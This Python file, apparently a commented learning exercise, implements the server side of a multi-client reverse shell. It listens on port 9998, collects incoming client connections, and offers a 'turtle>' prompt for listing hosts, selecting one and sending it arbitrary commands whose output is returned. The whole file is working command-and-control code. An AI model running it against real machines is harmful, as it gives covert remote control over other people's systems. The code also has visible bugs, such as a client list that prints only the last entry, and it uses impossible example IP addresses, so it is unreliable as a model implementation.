import socket
import sys   #used to implement command lines in our python file
import threading
import time
from queue import Queue

#task1: listen and accept connections from other clients
#task2: sending commands to already connected client(s)
numOfThreads = 2
jobNumber = [1,2]
queue = Queue()
allConnections = []
allAddresses = []

#S1.creating socket: opening up tcp communication layer:
def createSocket():
    try:
        global host
        global port
        global s

        host=""            #empty strign menas that the server can listen from any computer, if host='1.2.3.4' means that our server will listen to connections that come from 1.2.3.4 only
        port=9998          #any arbitrary uncommon port number
        s=socket.socket()  #creating a socket object
    
    except socket.error as msg:
        print("Socket creation error: " + str(msg) + "\n"+"Retrying ...")
        createSocket()
        
#S2.binding OUR server to a specific port and listening to connections:
def bindSocket():
    try:
        global host                                                                                                                                                                                                                                                 
        global port
        global s
        print("Binding the port "+str(port))
        
        s.bind((host,port))
        
#S3.listening to connections (max 5 connections at a time)
        s.listen(5)
        
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n"+"Retrying ...")
        #bindSocket()
        
        
        

#Handling connections from multitple clients and saving to a list
#Closing previous connections whenever server.py file is restarted


##THREAD1-->LISTENING AND CONNECTING TO NEW CONNECTIONS:   


#S4.accepting connections with all clients(socket must be listening) and storing the conm and ip addr in respective lists:
def acceptingConnections():
    for c in allConnections:
        c.close()  #closing all the connection first
        
    del allConnections[:]
    del allAddresses[:]
    
    while True:
        try:
            conn,address=s.accept()   #it gives us (1)data of convo  (2)ip address and port num of the client
            s.setblocking(1)          #prevents timeout

            #storing the conn and ip addr in the lists:
            allConnections.append(conn)
            allAddresses.append(address) 
        
            print("connection has been established |"+"IP:"+ address[0]+ " | Port:" + str(address[1]))
        
        except:
            print("error accepting connections")



##THREAD2-->
#1.See all the clients
#2.select a client and connect to it
#3.send commands to the selected client

#list of clients:
#0,1,2-->selectIDs
#0 ip addr of A
#1 ip addr of B
#2 ip addr of C

#S5. Creating our own interactive command shell->'turtle'
def start_turtle():
    
    #we want to print out the contents(select id and ip addresses) of the list of clients ( listConnection() function ) when user types 'turtle>list'
    while True:
        cmd = input('turtle>')   #takes input from us-->our cmd shell will now show cwd as 'turtle>', whatever we write in our cmd terminal, it will be stored in this 'cmd' variable
        if(cmd=='list'):
            listConnections()
        
        #we want to get the CONN of the nth client from list of clients ( getTarget(select n) function ) when user types 'turtle>select n'
        elif 'select' in cmd:
            conn = getTarget(cmd)
            if(conn is not None):
                send_target_commands(conn)   #sending commands to the selected client
                
        else:
            print("command not recognised")
        
        
        
        
        
        
#S6. listConnections() --> to display all the current active connections with the client

def listConnections():
    results = ''
    
    selectID=0
    for selectID,conn in enumerate(allConnections):
        try:
            #we will check whether the connection is active by sending a dummy request:
            conn.send(str.encode(" "))
            conn.recv(201480)
        
        except: #if the connection is not active this will get executed
            del allConnections[selectID]
            del allAddresses[selectID]
            continue            
       
        #if the connection exists this will get executed:   
        results = str(selectID) + "  " + str(allAddresses[selectID][0]) + "  " + str(allAddresses[selectID][1]) + "\n"
    
    print("------Clients-----"+"\n"+results)
    
    


#S7. getTarget() --> to get the CONN of the nth(slectID) client from list of clients ( getTarget(select n) function ) when user types 'turtle>select n'
def getTarget(cmd):
    
    #cmd ='select n'
    
    try:
        target = cmd.replace('select ','')
        target=int(target) #target=n now
    
        #connection of nth selectID client
        conn = allConnections[target]

        print("you are now connected to: "+ str(allAddresses[target][0]))
        print(str(allAddresses[target][0]) + ">",end="")
        
        return conn

        #3.54.32.5>cmd

    except:
        print("selection not valid")
        return None


#turtle>list
#------Clients-----
#0 764.36.439.0 9999
#1 164.316.39.0 9999

#turtle>select 1
#-->you will be connected to the first client ip and you will send data to it
#7635.323.348.25>


#S8: creating the send_target_commands function to send cmds to the slected client:
def send_target_commands(conn):
    while True:
        try:
            cmd=input()     
            
            if(cmd=='quit'):  
                break #go back to start turtle function
                
            if(len(str.encode(cmd))>0): 
                conn.send(str.encode(cmd))  

            clientResponse=str(conn.recv(20480),"utf-8")
            print(clientResponse,end="")  
        
        except:
            print("error sending commands")
            break #go back to start turtle function
        
        
        
#########################################################################################################################################################################

#S9: Thread flow: threads take jobs from a queue and not a list
#1: create worker threads
#2: store jobs in queue
#3: create work function and get the queue

#task1: listen and accept connections from other clients
#task2: sending commands to already connected client(s)
#numOfThreads = 2 (number of tasks)
#jobNumber = [1,2]


#n tasks-->n members of queus-> each member of queue has work--> each work has one worker

def createWorkers():    #creating a worker for each work
    for _ in range(numOfThreads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():   #assigning the task to the queue members-->creating respective work to be done by corresponding worker
    while True:
        x = queue.get()
        if(x==1):
            createSocket()
            bindSocket()
            acceptingConnections()
        if(x==2):
            start_turtle()
        
        queue.task_done()
        
def createJobs():  #converting the list into queue
    for x in jobNumber:
        queue.put(x)
    queue.join()

createWorkers()
createJobs()















